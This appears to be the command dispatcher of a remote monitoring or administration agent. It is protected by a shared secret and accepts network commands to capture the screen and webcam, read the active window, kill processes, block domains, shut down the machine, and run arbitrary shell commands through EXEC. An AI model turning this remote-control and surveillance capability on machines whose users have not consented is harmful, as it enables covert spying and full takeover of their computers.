use process
use thread
import "native.dz" as native
import "processes.dz" as processes
import "security.dz" as security
import "sysutils.dz" as sysutils
import "../../Shared/constants.dz" as constants

# Dispatches the raw payload to the appropriate system command.
# @param {string} raw - The raw command payload received from network.
# @param {string} systemHostname - The hostname of this machine.
# @return {string} The result of the command execution.
fn dispatch(raw, systemHostname)
    let parts = raw.split("|||")
    if parts.length() < 2 or parts[0] != constants.SECRET_KEY
        return "ERR:UNAUTHORIZED"
    end
    
    let cmd = parts[1].strip()
    print("[Agent] Received: " + cmd.slice(0, 80))

    # Command matching using if/elif (cleaner structure)
    if cmd == "PING"
        return "PONG:" + systemHostname
        
    elif cmd == "EXIT"
        thread.spawnCode(`
use process
process.sleep(1.0)
process.exit(0)
`)
        return "OK:EXIT"
        
    elif cmd == "SYSINFO"
        return sysutils.getSysInfo()
        
    elif cmd == "LOCK"
        process.exec("rundll32.exe user32.dll,LockWorkStation")
        return "OK:LOCK"
        
    elif cmd == "SHUTDOWN"
        process.exec("shutdown /s /t 5")
        return "OK:SHUTDOWN"
        
    elif cmd == "RESTART"
        process.exec("shutdown /r /t 5")
        return "OK:RESTART"
        
    elif cmd == "SCREENSHOT"
        return native.takeScreenshot()
        
    elif cmd == "WEBCAM"
        return native.takeWebcamSnapshot()
        
    elif cmd == "ACTIVE_WINDOW"
        return native.getActiveWindow()
        
    elif cmd == "TASKS"
        return processes.getTasks()
        
    elif cmd.startsWith("KILL:")
        return processes.killTask(cmd.slice(5, cmd.length()).strip())
        
    elif cmd.startsWith("MSG:")
        return sysutils.showMessage(cmd.slice(4, cmd.length()))
        
    elif cmd.startsWith("BLOCK:")
        return security.blockDomain(cmd.slice(6, cmd.length()).strip())
        
    elif cmd.startsWith("UNBLOCK:")
        return security.unblockDomain(cmd.slice(8, cmd.length()).strip())
        
    elif cmd.startsWith("SCHEDULE:")
        return security.setSchedule(cmd.slice(9, cmd.length()).strip())
        
    elif cmd.startsWith("EXEC:")
        let shellCmd = cmd.slice(5, cmd.length())
        let result = process.exec(shellCmd)
        return "EXEC_RESULT:" + result["stdout"] + result["stderr"]
        
    else
        return "ERR:UNKNOWN_COMMAND:" + cmd
    end
end
